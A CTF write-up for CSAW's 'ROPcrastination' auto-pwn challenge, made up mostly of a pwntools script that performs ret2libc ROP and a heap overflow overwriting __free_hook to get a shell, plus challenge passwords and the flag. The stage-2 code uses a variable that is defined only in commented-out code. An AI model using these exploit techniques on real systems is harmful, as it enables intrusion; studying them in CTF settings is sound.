# ROPcrastination

## Challenge

The program consists of 2 stages with 20 levels each.
Each level requires the password from the previous level.
The challenge binary is provided as a hexdump.

## Solution

Stage 1 is a simple buffer overflow to ret2libc.

Stage 2 is a heap buffer overflow to overwrite `__free_hook` and call `system("/bin/sh")`.
At first, I tried manually calculating the offset to the other heap pointer.
However, I realised later, after some errors in my calculations, that it was easier to overwrite everything by filling the payload upto a large length.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host auto-pwn.chal.csaw.io --port 11001 vuln
from pwn import *
from binascii import unhexlify
import r2pipe
import re

# Set up pwntools for the correct architecture
# exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'auto-pwn.chal.csaw.io'
#port = int(args.PORT or 11001)
#port = int(args.PORT or 11021)
#port = int(args.PORT or 11024)
#port = int(args.PORT or 11025)
port = int(args.PORT or 11037)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

pattern = re.compile("^[0-9,a-f]{4}$")
#password = b"8d16635db965bc4e0a97521e8105fad2"
#password = b"13462b403d91edd8c8389517c1eca3ed"
#password = b"342fd7a703b4a9a8831d9e67c32f19a0"
#password = b"fea5e6b8727b42903a449640963e27b5"
password = b"4a84282acf49ddd26afd33ec0ccdcab7"

while True:
    io = start()

    io.sendlineafter(b"Input password to continue:\n", password)
    io.recvuntil(b"-------------------------------------------------------------------\n")

    vuln = b""

    while True:
        line = io.recvline()

        if b"-------------------------------------------------------------------\n" in line:
            break

        dump = line.split()[1:9]

        for i in dump:
            if not pattern.match(i.decode()):
                break

            vuln += unhexlify(i)

    f = open('./vuln', 'wb')
    f.write(vuln)
    f.close()
    exe = context.binary = ELF('vuln')
    libc = ELF('libc-2.24.so')

    io.recvuntil(b'Proceeding to the challenge...\n\n')

    line_in = io.recvline()

    if b'Main is at ' in line_in:
        
        log.info("STAGE 1")

        exe.address = int(line_in[len('Main is at '):-1], 16) - exe.sym['main']

        log.info("main: {}".format(hex(exe.address)))

        rop = ROP(exe)

        payload = flat({
            0x1+0x8: [
                rop.find_gadget(['pop rdi', 'ret'])[0],
                exe.got['puts'],
                exe.plt['puts'],
                exe.sym['main'],
                exe.sym['runChallenge'],
                ]
            })

        io.sendline(payload)


        libc.address = unpack(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - libc.sym['puts']

        io.sendlineafter(b">", password)
        io.recvuntil(b'Main is at ')
        io.recvline()

        log.info("libc: {}".format(hex(libc.address)))

        payload = flat({
            0x1+0x8: [
                rop.find_gadget(['pop rdi', 'ret'])[0],
                next(libc.search(b'/bin/sh\x00')),
                libc.sym['system'],
                ]
            })

        io.sendline(payload)

    else:

        def roundUp(n):
            return (n + 0x7) // 0x10 * 0x10 

        log.info("STAGE 2")

        r = r2pipe.open('vuln')
        r.cmd('aaa')

        canary = b''

        for string in r.cmdj('fs strings; fj'):
            if string['size'] == 16:
                canary = r.cmdj('pfj z @ ' + string['name'])[0]['value'].encode()
                break

        log.success("Canary: {}".format(canary))

        '''
        structOffset = r.cmd('pdf @ sym.initializeShirts~[rbx').split(']')[0].split('[')[1].split(' + ')
        if len(structOffset) == 1:
            structOffset = 0
        else:
            structOffset = int(structOffset[1], 0)

        io.success("Struct offset: {}".format(hex(structOffset)))


        tweetSize = int(r.cmd('pdf @ sym.initializeShirts~size_t size').splitlines()[4].split(' ; ')[2])

        log.success("Tweet shirt size: {}".format(hex(tweetSize)))

        otherShirtOffset = roundUp(tweetSize) + structOffset + 0x40

        log.success("Offset: {}".format(hex(otherShirtOffset)))
        '''

        io.sendlineafter(b'Enter your choice (1-3): ', b'1')
        io.sendlineafter(b'Please enter the shirt you want to edit (1 or 2): ', b'1')
        io.sendlineafter(b'How long is your hacker name? ', b'1000')

        payload = flat({
            tweetSize + 0x20: canary,
            # otherShirtOffset: exe.got['puts'],
            }, filler = pack(exe.got['puts']), length=0x100)

        io.sendlineafter(b'Please enter the hacker name: ', payload)

        io.sendlineafter(b'Enter your choice (1-3): ', b'2')
        io.sendlineafter(b'Please enter the shirt you want to read (1 or 2): ', b'2')
        io.recvuntil(b'Shirt 2 reads: ')

        libc.address = unpack(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - libc.sym['puts']
        log.info("libc: {}".format(hex(libc.address)))

        io.sendlineafter(b'Enter your choice (1-3): ', b'1')
        io.sendlineafter(b'Please enter the shirt you want to edit (1 or 2): ', b'1')
        io.sendlineafter(b'How long is your hacker name? ', b'1000')

        payload = flat({
            tweetSize + 0x20: canary,
            # otherShirtOffset: libc.sym['__free_hook'],
            }, filler = pack(libc.sym['__free_hook']), length=0x100)

        io.sendlineafter(b'Please enter the hacker name: ', payload)

        io.sendlineafter(b'Enter your choice (1-3): ', b'1')
        io.sendlineafter(b'Please enter the shirt you want to edit (1 or 2): ', b'2')
        io.sendlineafter(b'How long is your hacker name? ', b'1000')

        payload = flat({
            0: libc.sym['system'],
            })

        io.sendlineafter(b'Please enter the hacker name: ', payload)

        io.sendlineafter(b'Enter your choice (1-3): ', b'1')
        io.sendlineafter(b'Please enter the shirt you want to edit (1 or 2): ', b'1')
        io.sendlineafter(b'How long is your hacker name? ', b'1000')

        payload = flat({
            tweetSize + 0x20: canary,
            # otherShirtOffset: 0,
            }, filler = pack(0), length=0x100)

        io.sendlineafter(b'Please enter the hacker name: ', payload)

        io.sendlineafter(b'Enter your choice (1-3): ', b'1')
        io.sendlineafter(b'Please enter the shirt you want to edit (1 or 2): ', b'1')
        io.sendlineafter(b'How long is your hacker name? ', b'1000')
        io.sendlineafter(b'Please enter the hacker name: ', b'/bin/sh\x00')

        io.sendlineafter(b'Enter your choice (1-3): ', b'3')

    if port == 11040:
        io.interactive()
        break

    io.sendline(b"cat message.txt")

    io.recvuntil(b"nc auto-pwn.chal.csaw.io ")
    port = int(io.recvuntil(b" ", drop=True))

    io.recvuntil(b"password ")
    password = io.recvuntil(b"\n", drop=True)

    io.close()

    print(password)

io.interactive()
```

## Flag

`flag{ROPcr4st1n4t10n_sh0uld_b3_4_b4nd_n4m3}`
